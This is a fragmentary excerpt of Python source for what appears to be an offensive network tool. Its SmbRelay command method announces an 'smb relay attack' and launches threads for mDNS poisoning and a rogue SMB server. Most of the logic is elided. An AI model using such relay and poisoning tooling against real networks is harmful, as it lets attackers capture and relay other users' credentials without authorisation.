...
import threading
import argparse
from .servers.smbserver import SmbServer
...
class SmbRelay(CommandSet):
    ...
    def do_smb_relay(self, args: argparse.Namespace) -> None:
        ...
        self._cmd.logger.info(
            f"""Starting smb relay attack using ip: {self._cmd.IP_TARGET}
        ...
        if args.show_settable:
            ...
            try:
                mdns_thread = threading.Thread(
                    target=mdns_poisoner.start_mdns_poisoning, args=(self.stop_attack,)
                )
                mdns_thread.daemon = True
                mdns_thread.start()

                smbserver_thread = threading.Thread(target=smbserver.start_smbserver)
